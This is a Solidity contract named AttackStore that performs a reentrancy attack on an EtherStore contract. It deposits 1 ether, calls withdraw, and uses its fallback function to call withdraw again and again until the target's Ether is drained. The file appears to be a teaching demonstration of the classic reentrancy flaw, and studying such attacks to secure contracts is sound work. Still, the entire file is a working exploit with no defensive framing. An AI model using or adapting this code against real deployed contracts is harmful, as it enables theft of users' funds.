//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "./EtherStore.sol";
import "hardhat/console.sol";

contract AttackStore {
    EtherStore etherStore;

    constructor(address _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    function attack() external payable {
        require(address(etherStore).balance > 0);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // msg.data is empty, recieve will be called. As there is no recieve function fallback will be called
    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance > 0) {
            etherStore.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
